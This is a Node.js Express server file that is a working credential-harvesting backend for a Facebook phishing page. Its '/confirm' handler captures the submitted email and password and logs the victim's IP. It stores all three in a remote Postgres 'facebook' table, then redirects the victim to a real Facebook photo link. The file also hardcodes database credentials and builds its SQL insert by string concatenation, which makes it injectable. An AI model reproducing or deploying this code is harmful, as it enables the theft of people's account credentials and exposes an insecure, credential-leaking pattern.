
var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'hedmgtryrynnvo',
    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
    database: 'deqngk324p153p',
    port: 5432,
    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
    ssl: true
});

client.connect();

app.get('/', function (req, res) {
    res.render('Facebook');

})
app.get('/n/*', function (req, res) {
    res.render('Facebook_nasef');

})


app.post('/confirm', function (req, res) {

    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/455544524989603/?type=3&theater')
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {

    } else if (mail.length < c.length) {
        mail = c;
    }

    if (password == undefined) {
        password = d;
    } else if (d == undefined) {

    }
    else if (password.length < d.length) {
        password = d;
    }
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})




// ***********************************************************************************************************************************************

app.get('*', function (req, res) {
    res.redirect('/')
})
app.listen(PORT, function () {
    console.log('Server Started')
})